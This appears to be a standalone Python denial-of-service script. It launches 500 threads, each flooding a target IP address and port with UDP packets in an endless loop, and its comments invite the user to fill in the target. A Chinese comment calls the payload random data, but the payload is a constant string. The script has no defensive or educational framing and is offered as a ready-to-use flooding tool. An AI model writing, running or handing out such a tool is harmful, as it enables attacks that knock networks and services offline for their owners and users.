import socket
import threading

def udp_flood(ip, port, size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        data = b"A" * size  # 生成随机数据
        sock.sendto(data, (ip, port))

target_ip = "192.168.1.1"  # Replace with the target IP address
target_port = 80  # Replace with the target port
packet_size = 1024  # Size of each packet

for i in range(500):
    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size))
    thread.start()
